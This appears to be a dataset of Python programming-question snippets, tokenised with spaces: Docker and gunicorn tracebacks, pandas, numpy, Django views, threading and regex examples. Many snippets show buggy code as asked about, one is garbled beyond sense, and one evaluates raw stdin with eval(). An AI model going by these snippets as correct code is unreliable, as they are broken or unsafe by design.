"FROM python:3.6-buster as buildENV STATIC_URL /staticENV STATIC_PATH /var/www/app/staticWORKDIR /var/www/RUN python -m venv /opt/venvENV PATH= '' /opt/venv/bin : $ PATH '' COPY requirements.txt .RUN pip install -r requirements.txtRUN pip install gunicornRUN apt-get update -y & & apt-get install -y -- no-install-recommends build-essential gcc \ libsndfile1 FROM python:3.6-buster AS runCOPY -- from=build /opt/venv /opt/venvCOPY . .ENV PATH= '' /opt/venv/bin : $ PATH '' RUN gunicorn -b :5000 -- access-logfile - -- error-logfile - app : app [ 2020-04-15 17:30:02 +0000 ] [ 7 ] [ INFO ] Starting gunicorn 20.0.4 [ 2020-04-15 17:30:02 +0000 ] [ 7 ] [ INFO ] Listening at : http : //0.0.0.0:5000 ( 7 ) [ 2020-04-15 17:30:02 +0000 ] [ 7 ] [ INFO ] Using worker : sync [ 2020-04-15 17:30:02 +0000 ] [ 10 ] [ INFO ] Booting worker with pid : 10 [ 2020-04-15 17:30:03 +0000 ] [ 10 ] [ ERROR ] Exception in worker processTraceback ( most recent call last ) : File `` /opt/venv/lib/python3.6/site-packages/gunicorn/arbiter.py '' , line 583 , in spawn_worker worker.init_process ( ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/workers/base.py '' , line 119 , in init_process self.load_wsgi ( ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/workers/base.py '' , line 144 , in load_wsgi self.wsgi = self.app.wsgi ( ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/app/base.py '' , line 67 , in wsgi self.callable = self.load ( ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/app/wsgiapp.py '' , line 49 , in load return self.load_wsgiapp ( ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/app/wsgiapp.py '' , line 39 , in load_wsgiapp return util.import_app ( self.app_uri ) File `` /opt/venv/lib/python3.6/site-packages/gunicorn/util.py '' , line 358 , in import_app mod = importlib.import_module ( module ) File `` /usr/local/lib/python3.6/importlib/__init__.py '' , line 126 , in import_module return _bootstrap._gcd_import ( name [ level : ] , package , level ) File `` < frozen importlib._bootstrap > '' , line 994 , in _gcd_import File `` < frozen importlib._bootstrap > '' , line 971 , in _find_and_load File `` < frozen importlib._bootstrap > '' , line 955 , in _find_and_load_unlocked File `` < frozen importlib._bootstrap > '' , line 665 , in _load_unlocked File `` < frozen importlib._bootstrap_external > '' , line 678 , in exec_module File `` < frozen importlib._bootstrap > '' , line 219 , in _call_with_frames_removed File `` /app.py '' , line 12 , in < module > from emotion_model.test import load_model , inference_segment File `` /emotion_model/test.py '' , line 9 , in < module > import librosa File `` /opt/venv/lib/python3.6/site-packages/librosa/__init__.py '' , line 12 , in < module > from . import core File `` /opt/venv/lib/python3.6/site-packages/librosa/core/__init__.py '' , line 126 , in < module > from .audio import * # pylint : disable=wildcard-import File `` /opt/venv/lib/python3.6/site-packages/librosa/core/audio.py '' , line 10 , in < module > import soundfile as sf File `` /opt/venv/lib/python3.6/site-packages/soundfile.py '' , line 142 , in < module > raise OSError ( 'sndfile library not found ' ) OSError : sndfile library not found [ 2020-04-15 17:30:03 +0000 ] [ 10 ] [ INFO ] Worker exiting ( pid : 10 ) [ 2020-04-15 17:30:03 +0000 ] [ 7 ] [ INFO ] Shutting down : Master [ 2020-04-15 17:30:03 +0000 ] [ 7 ] [ INFO ] Reason : Worker failed to boot ."
"import matplotlibimport matplotlib.pyplot as pltimport numpy as np # Get an existing colorbarcb = 'CMRmap'cmap = plt.get_cmap ( cb ) # Variables to modify ( truncate ) the colormap withminval = 0.15 maxval = 0.95npoints = 100 # Now modify ( truncate ) the colorbarcmap = matplotlib.colors.LinearSegmentedColormap.from_list ( 'trunc ( { n } , { a : .2f } , { b : .2f } ) '.format ( n=cmap.name , a=minval , b=maxval ) , cmap ( np.linspace ( minval , maxval , npoints ) ) ) # Now the data can be extracted as a dictionarycdict = cmap._segmentdata # e.g . variables ( 'blue ' , 'alpha ' , 'green ' , 'red ' ) print ( cdict.keys ( ) ) # Now , is it possible to save to this as a .cpt ?"
$ which python/usr/bin/python $ whereis pythonpython : /bin/python.exe /bin/python2.5-config /usr/bin/python.exe /usr/bin/python2.5-config /lib/python2.4 /lib/python2.5 /usr/lib/python2.4 /usr/lib/python2.5 /usr/include/python2.4 /usr/include/python2.5 /usr/share/man/man1/python.1 > > > which ( sys ) ' c : \\Python25\Lib\site-packages '
"from io import StringIOimport numpy as npimport pandas as pdnp.random.seed ( 444 ) dates = pd.date_range ( '1980 ' , '2018 ' ) df = pd.DataFrame ( np.random.randint ( 0 , 100 , ( len ( dates ) , 2 ) ) , index=dates ) .add_prefix ( 'col ' ) .reset_index ( ) # Something reproducible to be read back inbuf = StringIO ( ) df.to_string ( buf=buf , index=False ) def read_test ( **kwargs ) : # Not ideal for .seek ( ) to eat up runtime , but alleviate # this with more loops than needed in timing below buf.seek ( 0 ) return pd.read_csv ( buf , sep='\s+ ' , parse_dates= [ 'index ' ] , **kwargs ) # dateutil.parser.parser called in this case , according to docs % timeit -r 7 -n 100 read_test ( ) 18.1 ms ± 217 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each ) % timeit -r 7 -n 100 read_test ( infer_datetime_format=True ) 19.8 ms ± 516 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each ) # Does n't change with native Python datetime.strptime either % timeit -r 7 -n 100 read_test ( date_parser=lambda dt : pd.datetime.strptime ( dt , ' % Y- % m- % d ' ) ) 187 ms ± 4.05 ms per loop ( mean ± std . dev . of 7 runs , 100 loops each ) s = pd.Series ( [ ' 3/11/2000 ' , ' 3/12/2000 ' , ' 3/13/2000 ' ] *1000 ) % timeit pd.to_datetime ( s , infer_datetime_format=True ) 19.8 ms ± 1.54 ms per loop ( mean ± std . dev . of 7 runs , 10 loops each ) % timeit pd.to_datetime ( s , infer_datetime_format=False ) 1.01 s ± 65.8 ms per loop ( mean ± std . dev . of 7 runs , 1 loop each ) # This was taking the longest with i/o functions , # now it 's behaving `` as expected '' % timeit pd.to_datetime ( s , format= ' % m/ % d/ % Y ' ) 19 ms ± 373 µs per loop ( mean ± std . dev . of 7 runs , 10 loops each )"
"class AddLinks ( webapp.RequestHandler ) : def post ( self ) : # Hash the textarea input to generate pseudo-unique value hash = md5.new ( self.request.get ( 'links ' ) ) .hexdigest ( ) # Seperate the input by line allLinks = self.request.get ( 'links ' ) .splitlines ( ) # For each line in the input , add to the database for x in allLinks : newGroup = LinkGrouping ( ) newGroup.reference = hash newGroup.link = x newGroup.put ( ) # testing vs live # baseURL = 'http : //localhost:8080 ' baseURL = 'http : //linkabyss.appspot.com ' # Build template parameters template_values = { 'all_links ' : allLinks , 'base_url ' : baseURL , 'reference ' : hash , } # Output the template path = os.path.join ( os.path.dirname ( __file__ ) , 'addLinks.html ' ) self.response.out.write ( template.render ( path , template_values ) )"
"import logginglogging.Logger.manager.loggerDict { 'nose.case ' : < celery.utils.log.ProcessAwareLoggerobjectat0x112c8dcd0 > , 'apps.friends ' : < logging.PlaceHolderobjectat0x1147720d0 > , 'oauthlib.oauth2.rfc6749.grant_types.client_credentials ' : < celery.utils.log.ProcessAwareLoggerobjectat0x115c48710 > , 'apps.adapter.views ' : < celery.utils.log.ProcessAwareLoggerobjectat0x116a847d0 > , 'apps.accounts.views ' : < celery.utils.log.ProcessAwareLoggerobjectat0x116976990 > , } There are more but I truncated it"
"ValueError : The truth value of a Series is ambiguous . Use a.empty , a.bool ( ) , a.item ( ) , a.any ( ) or a.all ( ) . import pandas as pd df = pd.DataFrame ( { ' a ' : [ None ] * 4 , ' b ' : [ 2 , 3 , 10 , 3 ] } ) df [ `` c '' ] =0 if df.b == 2 : df.c =1"
content_auto = indexes.EdgeNgramField ( model_attr='content ' )
"userc = forms.ModelChoiceField ( queryset=User.objects.filter ( is_staff=True ) ) from django.contrib import messagesfrom django.contrib.contenttypes.models import ContentTypefrom django.core.paginator import Paginator , EmptyPage , PageNotAnIntegerfrom django.db.models import Qfrom django.http import HttpResponse , HttpResponseRedirect , Http404from django.shortcuts import render , get_object_or_404 , redirectfrom django.utils import timezonefrom comments.forms import CommentFormfrom comments.models import Commentfrom .forms import PostFormfrom .models import Postfrom django.contrib.auth.models import Userdef post_create ( request ) : if not request.user.is_staff or not request.user.is_superuser : raise Http404 form = PostForm ( request.POST or None , request.FILES or None ) if form.is_valid ( ) : instance = form.save ( commit=False ) instance.user = request.user instance.save ( ) # message success messages.success ( request , `` Successfully Created '' ) return HttpResponseRedirect ( instance.get_absolute_url ( ) ) context = { `` form '' : form , } return render ( request , `` post_form.html '' , context ) def abc ( request ) : if request.method == `` POST '' : # Get the posted form form = PostForm ( request.POST ) if form.is_valid ( ) : userc = form.cleaned_data [ 'userc ' ] return render ( request , 'post_detail.html ' , { `` selected_user '' : userc } ) def post_detail ( request , slug=None ) : instance = get_object_or_404 ( Post , slug=slug ) if instance.publish > timezone.now ( ) .date ( ) or instance.draft : if not request.user.is_staff or not request.user.is_superuser : raise Http404 share_string = quote_plus ( instance.content ) initial_data = { `` content_type '' : instance.get_content_type , `` object_id '' : instance.id } form = CommentForm ( request.POST or None , initial=initial_data ) if form.is_valid ( ) and request.user.is_authenticated ( ) : c_type = form.cleaned_data.get ( `` content_type '' ) content_type = ContentType.objects.get ( model=c_type ) obj_id = form.cleaned_data.get ( 'object_id ' ) content_data = form.cleaned_data.get ( `` content '' ) parent_obj = None try : parent_id = int ( request.POST.get ( `` parent_id '' ) ) except : parent_id = None if parent_id : parent_qs = Comment.objects.filter ( id=parent_id ) if parent_qs.exists ( ) and parent_qs.count ( ) == 1 : parent_obj = parent_qs.first ( ) new_comment , created = Comment.objects.get_or_create ( user = request.user , content_type= content_type , object_id = obj_id , content = content_data , parent = parent_obj , ) return HttpResponseRedirect ( new_comment.content_object.get_absolute_url ( ) ) comments = instance.comments context = { `` title '' : instance.title , `` instance '' : instance , `` share_string '' : share_string , `` comments '' : comments , `` comment_form '' : form , } return render ( request , `` post_detail.html '' , context ) def post_list ( request ) : today = timezone.now ( ) .date ( ) queryset_list = Post.objects.active ( ) # .order_by ( `` -timestamp '' ) if request.user.is_staff or request.user.is_superuser : queryset_list = Post.objects.all ( ) query = request.GET.get ( `` q '' ) if query : queryset_list = queryset_list.filter ( Q ( title__icontains=query ) | Q ( content__icontains=query ) | Q ( user__first_name__icontains=query ) | Q ( user__last_name__icontains=query ) ) .distinct ( ) paginator = Paginator ( queryset_list , 8 ) # Show 25 contacts per page page_request_var = `` page '' page = request.GET.get ( page_request_var ) try : queryset = paginator.page ( page ) except PageNotAnInteger : # If page is not an integer , deliver first page . queryset = paginator.page ( 1 ) except EmptyPage : # If page is out of range ( e.g . 9999 ) , deliver last page of results . queryset = paginator.page ( paginator.num_pages ) context = { `` object_list '' : queryset , `` title '' : `` List '' , `` page_request_var '' : page_request_var , `` today '' : today , } return render ( request , `` post_list.html '' , context ) def post_update ( request , slug=None ) : if not request.user.is_staff or not request.user.is_superuser : raise Http404 instance = get_object_or_404 ( Post , slug=slug ) form = PostForm ( request.POST or None , request.FILES or None , instance=instance ) if form.is_valid ( ) : instance = form.save ( commit=False ) instance.save ( ) messages.success ( request , `` < a href= ' # ' > Item < /a > Saved '' , extra_tags='html_safe ' ) return HttpResponseRedirect ( instance.get_absolute_url ( ) ) context = { `` title '' : instance.title , `` instance '' : instance , `` form '' : form , } return render ( request , `` post_form.html '' , context ) def post_delete ( request , slug=None ) : if not request.user.is_staff or not request.user.is_superuser : raise Http404 instance = get_object_or_404 ( Post , slug=slug ) instance.delete ( ) messages.success ( request , `` Successfully deleted '' ) return redirect ( `` posts : list '' )"
"import numpy as npx = np.array ( [ [ 0 ] , [ 0 , 1 ] ] ) print ( x ) # [ list ( [ 0 ] ) list ( [ 0 , 1 ] ) ] import tensorflow as tfx = tf.ragged.constant ( [ [ 0 ] , [ 0 , 1 ] ] ) print ( x ) # < tf.RaggedTensor [ [ 0 ] , [ 0 , 1 ] ] > import torch # x = torch.Tensor ( [ [ 0 ] , [ 0 , 1 ] ] ) # ValueError"
"def do_stuff_for_some_time ( some_id ) : e = Model.objects.get ( id=some_id ) e.domanystuff ( ) do_stuff_for_some_time.apply_async ( args= [ some_id ] , queue='some_queue ' )"
"Python 3.4.2 ( default , Oct 8 2014 , 13:44:52 ) [ GCC 4.9.1 20140903 ( prerelease ) ] on linuxType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > gen = ( x for x in range ( 10 ) ) # # Need to wrap range into ( ) 's to create a generator , next ( range ( 10 ) ) is invalid > > > list ( zip ( gen , [ 1,2,3 ] ) ) # # zip will `` eat up '' the number 3 [ ( 0 , 1 ) , ( 1 , 2 ) , ( 2 , 3 ) ] > > > next ( gen ) # # Here i need next to return 34 > > > xs = list ( gen )"
"from Products.Five import BrowserViewclass Html ( BrowserView ) : def still_dreaming ( self ) : msg = `` Some people are still dreaming '' return msg def still_dreaming ( self , some_arg ) : msg = some_arg + `` Some people are still dreaming '' return msg < p tal : content= '' view/still_dreaming ( item/publication_date ) '' > < /p >"
class Plugin ( object ) : run_after_plugins = ( ) run_before_plugins = ( ) def order_plugins ( plugins ) : pass
postfix_expression = `` 34*34*+ '' stack = [ ] for char in postfix_expression : try : char = int ( char ) ; stack.append ( char ) ; except ValueError : if char == '+ ' : stack.append ( stack.pop ( ) + stack.pop ( ) ) elif char == '- ' : stack.append ( stack.pop ( ) - stack.pop ( ) ) elif char == '* ' : stack.append ( stack.pop ( ) * stack.pop ( ) ) elif char == '/ ' : stack.append ( stack.pop ( ) / stack.pop ( ) ) print stack.pop ( )
"import numpy as npfrom mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as plt # Grid and test functionN = 29 ; x , y = np.linspace ( -1,1 , N*2 ) , np.linspace ( -1,1 , N ) X , Y = np.meshgrid ( x , y ) F = lambda X , Y : np.sin ( 10*X ) / ( 1+5* ( X**2+Y**2 ) ) Z = F ( X , Y ) # 3D Surface plotplt.figure ( figsize = ( 5,6 ) ) Z2 = Z.copy ( ) ; Z2 [ 10 , : ] = 0 # < -- -- - Replace this codeax = plt.subplot ( 211 , projection='3d ' ) ax.plot_surface ( X , Y , Z2 ) # 2D Plot of slice of 3D plot plt.subplot ( 212 ) plt.plot ( x , Z [ 10 , : ] ) plt.show ( ) plt.savefig ( 'surfacePlotHighlight.png ' )"
"from coinor.pulp import * # ... prob = LpProblem ( `` MyProblem '' , LpMaximize ) # ... prob.solve ( CPLEX ( msg=0 ) )"
"import syswhile True : sys.stdout.write ( ' % s\n ' % eval ( sys.stdin.readline ( ) ) ) c : = exec.Command ( `` python '' , `` -u add.py '' ) si , _ : = c.StdinPipe ( ) so , _ : = c.StdoutPipe ( ) c.Start ( ) si.Write ( [ ] byte ( `` 2+2\n '' )"
"import numpy as npa = np.eye ( 2 ) b = np.array ( [ 1,1 ] , [ 0,1 ] ) my_list = [ a , b ]"
"suffixdict : { suffix1 : [ type1 , type2 , ... , type ( n ) ] , suffix2 : [ type1 , type2 , ... , type ( n ) ] } lemmaformdict : { lemmaform : { type1 : lemma } }"
"userID dayID feature0 feature1 feature2 feature3xy1 0 24 15.3 41 43xy1 1 5 24 34 40xy1 2 30 7 8 10gh3 0 50 4 11 12gh3 1 49 3 59 11gh3 2 4 9 12 15 ... userID feature0 feature1 feature2 feature3 xy1 5 15.3 41 10 gh3 49 4 11 15 ... reduced_features = features.reset_index ( ) .groupby ( 'userID ' ) .agg ( lambda x : np.random.choice ( x,1 ) )"
for i in range ( 10 ) : x = 1 for j in range ( 10 in range ( 10 ( x =++-+ 1+-
"n_pts = 500X , y = datasets.make_circles ( n_samples=n_pts , random_state=123 , noise=0.1 , factor=0.2 ) x_data = torch.FloatTensor ( X ) y_data = torch.FloatTensor ( y.reshape ( 500 , 1 ) ) class Model ( nn.Module ) : def __init__ ( self , input_size , H1 , output_size ) : super ( ) .__init__ ( ) self.linear = nn.Linear ( input_size , H1 ) self.linear2 = nn.Linear ( H1 , output_size ) def forward ( self , x ) : x = torch.sigmoid ( self.linear ( x ) ) x = torch.sigmoid ( self.linear2 ( x ) ) return x def predict ( self , x ) : pred = self.forward ( x ) if pred > = 0.5 : return 1 else : return 0"
F F F F FT F F F FT T F F FT T T F F ... F T F F F ...
https : //github.com/ddollar/heroku-buildpack-apthttps : //github.com/heroku/heroku-buildpack-python.git remote : C_INCLUDE_PATH is /app/.heroku/vendor/include : /app/.heroku/vendor/include : /app/.heroku/python/includeremote : CPATH is /tmp/build_xxxxx/.apt/usr/include : remote : LD_LIBRARY_PATH is /app/.heroku/vendor/lib : /app/.heroku/vendor/lib : /app/.heroku/python/lib remote : building 'GeoIP ' extensionremote : creating buildremote : creating build/temp.linux-x86_64-2.7remote : gcc -pthread -fno-strict-aliasing -g -O2 -DNDEBUG -g -fwrapv -O3 -Wall -Wstrict-prototypes -fPIC -I/app/.heroku/python/include/python2.7 -c py_GeoIP.c -o build/temp.linux-x86_64-2.7/py_GeoIP.o -fno-strict-aliasingremote : creating build/lib.linux-x86_64-2.7remote : gcc -pthread -shared build/temp.linux-x86_64-2.7/py_GeoIP.o -lGeoIP -o build/lib.linux-x86_64-2.7/GeoIP.soremote : /usr/bin/ld : can not find -lGeoIPremote : collect2 : error : ld returned 1 exit statusremote : error : command 'gcc ' failed with exit status 1
"class Foo ( object ) : def bar ( self ) : print `` baz '' qux = Foo ( ) qux.bar ( ) Foo.bar ( qux ) # ! /usr/bin/env python # -*- coding : utf-8 -*-import randomanimals = [ ( `` Bella '' , `` cow '' ) , ( `` Spike '' , `` dog '' ) , ( `` José '' , `` iguana '' ) , ( `` Tux '' , `` penguin '' ) ] class Animal ( object ) : @ staticmethod def populate ( *args ) : return map ( lambda x : Animal ( *x ) , animals ) def __init__ ( self , name = None , species = None ) : def bar ( ) : self.name , self.species = random.choice ( animals ) self.name = name self.species = species self.populate = bar def __repr__ ( self ) : return `` % s of species % s '' % ( self.name , self.species ) print Animal.populate ( ) print Animal ( `` Pinky '' , `` mouse '' ) qux = Animal ( ) qux.populate ( ) print qux"
"import restr = `` XaXbXcX '' pattern = r ' X ( [ a-z ] ) X'matches = re.findall ( pattern , str ) # gives me [ ' a ' , ' c ' ] . What about b ?"
"from threading import Threadfrom time import timeBIG_NUMBER = 100000count = BIG_NUMBERdef countdown ( n ) : global count for i in range ( n ) : count -= 1start = time ( ) countdown ( count ) end = time ( ) print ( 'Without Threading : Final count = { final_n } , Execution Time = { exec_time } '.format ( final_n=count , exec_time=end - start ) ) count = BIG_NUMBERa = Thread ( target=countdown , args= ( BIG_NUMBER//2 , ) ) b = Thread ( target=countdown , args= ( BIG_NUMBER//2 , ) ) start = time ( ) a.start ( ) b.start ( ) a.join ( ) b.join ( ) end = time ( ) print ( 'With Threading : Final count = { final_n } , Execution Time = { exec_time } '.format ( final_n=count , exec_time=end - start ) ) Without Threading : Final count = 0 , Execution Time = 0.02498459815979004With Threading : Final count = 21 , Execution Time = 0.023985862731933594"
"( ( ( `` A '' , '' B '' , '' C '' ) , ( `` D '' ) , ( `` E '' ) ) ; ( ( ( `` A '' , '' B '' , '' D '' ) , ( `` C '' ) , ( `` E '' ) ) ; ( ( ( `` A '' , '' C '' , '' D '' ) , ( `` B '' ) , ( `` E '' ) ) ; ( ( ( `` B '' , '' C '' , '' D '' ) , ( `` A '' ) , ( `` E '' ) ) ; ( ( ( `` A '' , '' B '' ) ( `` C '' , '' D '' ) , ( `` E '' ) ) ; ( ( ( `` A '' , '' C '' ) ( `` B '' , '' D '' ) , ( `` E '' ) ) ; ( ( ( `` B '' , '' C '' ) ( `` A '' , '' D '' ) , ( `` E '' ) ) ; ( ( `` A '' , '' B '' , '' C '' , '' D '' ) , ( `` E '' ) ) ; ( ( ( ( `` A '' , '' B '' ) , '' C '' ) , '' D '' ) , ( `` E '' ) ) ; ( ( ( `` C '' , '' B '' , '' A '' ) , ( `` D '' ) , ( `` E '' ) ) ; ( ( ( `` C '' , '' A '' , '' B '' ) , ( `` D '' ) , ( `` E '' ) ) ; ( ( ( `` A '' , '' C '' , '' B '' ) , ( `` D '' ) , ( `` E '' ) ) ; import itertoolsdef Newick_Permutation_Generator ( list_of_species , name_of_outgroup ) permutations_list = ( list ( itertools.permutations ( [ `` A '' , '' B '' , '' C '' , '' D '' , '' E '' ] ) ) ) for given_permutation in permutations_list : process ( given_permutation ) Newick_Permutation_Generator ( [ `` A '' , '' B '' , '' C '' , '' D '' , '' E '' ] , `` E '' )"
"class Agent ( object ) : def __init__ ( self , cards ) : self.cards = cards def __len__ ( self ) : return len ( self.cards ) def __iter__ ( self ) : return self.cards agent = Agent ( [ 1,2,3,4 ] ) myfunc ( *agent ) TypeError : visualize ( ) argument after * must be a sequence , not Agent"
"set maxdepth 2000 { a 0.9 hue 30 } R1 rule R1 { { x 1 rz 3 ry 5 } R1 { s 1 1 0.1 sat 0.9 } box } rule R1 { { x 1 rz -3 ry 5 } R1 { s 1 1 0.1 } box } rule : r1 do r1 : x = > 1 , : rz = > 3 , : ry = > 5 box : s = > [ 1 , 1 , 0.1 ] , : sat = > 0.9endrule : r1 do r1 : x = > 1 , : rz = > -3 , : ry = > 5 box : s = > [ 1 , 1 , 0.1 ] end"
"elems = [ `` A '' , `` B '' , `` C '' , `` D '' ] ans = 2*elemsrandom.shuffle ( ans )"
"File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/template/defaulttags.py '' , line 285 , in render return nodelist.render ( context ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/template/base.py '' , line 830 , in render bit = self.render_node ( node , context ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/template/base.py '' , line 844 , in render_node return node.render ( context ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/templatetags/static.py '' , line 109 , in render url = self.url ( context ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/contrib/staticfiles/templatetags/staticfiles.py '' , line 12 , in url return staticfiles_storage.url ( path ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/contrib/staticfiles/storage.py '' , line 136 , in url hashed_name = self.cache.get ( cache_key ) File `` /usr/local/myproject/.env/lib/python2.7/site-packages/django/core/cache/backends/memcached.py '' , line 64 , in get val = self._cache.get ( key ) Error : error 31 from memcached_get ( myproject:1 : staticfiles:27e4bc0 ) : A TIMEOUT OCCURRED"
"lat = float ( request.GET.get ( 'lat ' ) ) lng = float ( request.GET.get ( 'lng ' ) ) a = Authority.objects.get ( area__contains=Point ( lng , lat ) ) if a : return HttpResponse ( simplejson.dumps ( { 'name ' : a.name , 'area ' : a.area.geojson , 'id ' : a.id } ) , mimetype='application/json ' ) { `` id '' : 95 , `` name '' : `` Roskilde '' , `` area '' : `` { \ '' type\ '' : \ '' MultiPolygon\ '' , \ '' coordinates\ '' : [ [ [ [ 12.078701 , 55.649927 ] , ... ] ] ] } '' }"
"from sympy import *x = symbols ( `` x '' ) def coeff ( f , k , var = x ) : return integrate ( f ( var ) * cos ( k * var ) , ( var , -pi , pi ) ) / pif = lambda x : ( 11*sin ( x ) + 6*sin ( 2*x ) + 2*sin ( 3*x ) ) /10 [ coeff ( f , k ) for k in range ( 0 , 5 ) ]"
"def min_max_downsample ( x , y , num_bins ) : `` '' '' Break the data into num_bins and returns min/max for each bin '' '' '' pts_per_bin = x.size // num_bins # Create temp to hold the reshaped & slightly cropped y y_temp = y [ : num_bins*pts_per_bin ] .reshape ( ( num_bins , pts_per_bin ) ) y_out = np.empty ( ( num_bins,2 ) ) # Take the min/max by rows . y_out [ : ,0 ] = y_temp.max ( axis=1 ) y_out [ : ,1 ] = y_temp.min ( axis=1 ) y_out = y_out.ravel ( ) # This duplicates the x-value for each min/max y-pair x_out = np.empty ( ( num_bins,2 ) ) x_out [ : ] = x [ : num_bins*pts_per_bin : pts_per_bin , np.newaxis ] x_out = x_out.ravel ( ) return x_out , y_out def min_max_downsample_v2 ( x , y , num_bins ) : pts_per_bin = x.size // num_bins # Create temp to hold the reshaped & slightly cropped y y_temp = y [ : num_bins*pts_per_bin ] .reshape ( ( num_bins , pts_per_bin ) ) # use argmax/min to get column locations cc_max = y_temp.argmax ( axis=1 ) cc_min = y_temp.argmin ( axis=1 ) rr = np.arange ( 0 , num_bins ) # compute the flat index to where these are flat_max = cc_max + rr*pts_per_bin flat_min = cc_min + rr*pts_per_bin # Create a boolean mask of these locations mm_mask = np.full ( ( x.size , ) , False ) mm_mask [ flat_max ] = True mm_mask [ flat_min ] = True x_out = x [ mm_mask ] y_out = y [ mm_mask ] return x_out , y_out x_big = np.linspace ( 0,10,100000000 ) y_big = np.cos ( x_big ) x_small , y_small = min_max_downsample ( x_big , y_big ,2000 ) # Fast but not exactly correct.x_small , y_small = min_max_downsample_v2 ( x_big , y_big ,2000 ) # correct but not exactly fast ."
> dfleg speed 1 10 1 11 1 12 1 13 1 12 1 15 1 19 1 12 2 10 2 10 2 12 2 15 2 19 2 11 : : leg speed roll_speed 1 10 10 # 10/1 1 11 10.5 # ( 10+11 ) /2 1 12 11 # ( 10+11+12 ) /3 1 13 11.5 # ( 10+11+12+13 ) /4 1 12 11.6 # ( 10+11+12+13+12 ) /5 1 15 12.6 # ( 11+12+13+12+15 ) /5 1 19 14.2 # ( 12+13+12+15+19 ) /5 1 12 14.2 # ( 13+12+15+19+12 ) /5 2 10 10 # 10/1 2 10 10 # ( 10+10 ) /2 2 12 10.7 # ( 10+10+12 ) /3 2 15 11.8 # ( 10+10+12+15 ) /4 2 19 13.2 # ( 10+10+12+15+19 ) /5 2 11 13.4 # ( 10+12+15+19+11 ) /5 : : df [ 'roll_speed ' ] = df.speed.rolling ( 5 ) .mean ( )
"import numpy as npimport pandas as pdtempDF = pd.DataFrame ( { 'id ' : [ 0,1,2,3,4 ] , 'date ' : [ '0001-01-01 00:00:00.0000000 ' , '2015-05-22 00:00:00.0000000 ' , '0001-01-01 00:00:00.0000000 ' , '2015-05-06 00:00:00.0000000 ' , '2015-05-03 00:00:00.0000000 ' ] } ) print ( tempDF ) date id0 0001-01-01 00:00:00.0000000 01 2015-05-22 00:00:00.0000000 12 0001-01-01 00:00:00.0000000 23 2015-05-06 00:00:00.0000000 34 2015-05-03 00:00:00.0000000 4 print ( tempDF.dtypes ) date objectid int64dtype : objectprint ( tempDF.dtypes ) tempDF [ 'date ' ] = pd.to_datetime ( tempDF [ 'date ' ] ) print ( tempDF ) date id0 2001-01-01 01 2015-05-22 12 2001-01-01 23 2015-05-06 34 2015-05-03 4"
"class NameMeta ( type ) : def __new__ ( cls , name , bases , dic ) : if 'gender ' not in dic : setattr ( name , 'gender ' , 'Male ' ) return super ( ) .__new__ ( cls , name , bases , dic ) class MyName ( metaclass=NameMeta ) : def __init__ ( self , fname , lname ) : self.fname = fname self.lname = lname def fullname ( self ) : self.full_name = self.fname + self.lname return self.full_name inst = MyName ( 'Joseph ' , 'Vincent ' ) print ( MyName.gender ) < ipython-input-111-550ff3cfae41 > in __new__ ( cls , name , bases , dic ) 2 def __new__ ( cls , name , bases , dic ) : 3 if 'gender ' not in dic : -- -- > 4 setattr ( name , 'gender ' , 'Male ' ) 5 return super ( ) .__new__ ( cls , name , bases , dic ) 6 AttributeError : 'str ' object has no attribute 'gender '"
"{ `` session_id '' : { `` 0 '' : [ `` X061RFWB06K9V '' ] , '' 1 '' : [ `` 5AZ2X2A9BHH5U '' ] } , '' unix_timestamp '' : { `` 0 '' : [ 1442503708 ] , '' 1 '' : [ 1441353991 ] } , '' cities '' : { `` 0 '' : [ `` New York NY , Newark NJ '' ] , '' 1 '' : [ `` New York NY , Jersey City NJ , Philadelphia PA '' ] } , '' user '' : { `` 0 '' : [ [ { `` user_id '' :2024 , '' joining_date '' : '' 2015-03-22 '' , '' country '' : '' UK '' } ] ] , '' 1 '' : [ [ { `` user_id '' :2853 , '' joining_date '' : '' 2015-03-28 '' , '' country '' : '' DE '' } ] ] } } import numpy as npimport pandas as pdimport jsonfrom pandas.io.json import json_normalize # attempt1df = pd.read_json ( ' a.json ' ) # attempt2with open ( ' a.json ' ) as fi : data = json.load ( fi ) df = json_normalize ( data , record_path='user ' , meta= [ 'session_id ' , 'unix_timestamp ' , 'cities ' ] ) Both of them do not give me the required output . session_id unix_timestamp cities user_id joining_date country 0 X061RFWB06K9V 1442503708 New York NY 2024 2015-03-22 UK 0 X061RFWB06K9V 1442503708 Newark NJ 2024 2015-03-22 UK I would love to see implementation of pd.io.json.json_normalizepandas.io.json.json_normalize ( data : Union [ Dict , List [ Dict ] ] , record_path : Union [ str , List , NoneType ] = None , meta : Union [ str , List , NoneType ] = None , meta_prefix : Union [ str , NoneType ] = None , record_prefix : Union [ str , NoneType ] = None , errors : Union [ str , NoneType ] = 'raise ' , sep : str = ' . ' , max_level : Union [ int , NoneType ] = None )"
"# 1Dnp.array ( [ 0,1,2,3,0 ] ) # 2Dnp.array ( [ [ 0 , 0 , 0 , 0 ] , [ 0 , 1 , 0 , 0 ] , [ 0 , 2 , 3 , 0 ] , [ 0 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 0 ] ] ) # 3Dnp.array ( [ [ [ 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 ] ] , [ [ 0 , 0 , 0 , 0 ] , [ 0 , 1 , 2 , 0 ] , [ 0 , 0 , 0 , 0 ] ] , [ [ 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 0 ] ] ] ) x = np.random.rand ( 5 , 5 ) assert np.sum ( x [ 0 : , 0 ] ) == 0assert np.sum ( x [ 0 , 0 : ] ) == 0assert np.sum ( x [ 0 : , -1 ] ) == 0assert np.sum ( x [ -1 , 0 : ] ) == 0"
